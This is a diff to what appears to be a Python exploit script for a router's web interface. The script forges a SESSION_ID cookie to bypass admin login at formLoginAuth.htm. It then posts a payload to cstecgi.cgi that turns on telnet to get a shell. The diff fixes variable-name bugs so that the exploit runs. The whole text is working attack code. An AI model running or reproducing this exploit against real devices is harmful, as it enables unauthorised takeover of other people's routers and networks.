@@ -104,15 +104,15 @@ url = "formLoginAuth.htm?authCode=1&userName=admin"
 cookie = {"SESSION_ID" : "2:%d:2" % round(time.time())}
 
 bypass_admin_url = http_sv + url
-bypass_admin = requests.get(bypass_admin_url, cookies=cookie)
+requests.get(bypass_admin_url, cookies=cookie)
 
 cgi_url = "cgi-bin/cstecgi.cgi"
 payload = """
     {"telnet_enabled":"1","topicurl":"setTelnetCfg"}
 """
 
-enable_telnet_url = http_sv + url_cgi
-enable_telnet = requests.post(enable_telnet, data=payload, cookies=cookie)
+enable_telnet_url = http_sv + cgi_url
+res = requests.post(enable_telnet_url, data=payload, cookies=cookie)
 
 if res.status_code == 200:
     print("[+] Telnet enabled !!\n[+] Get shell...")
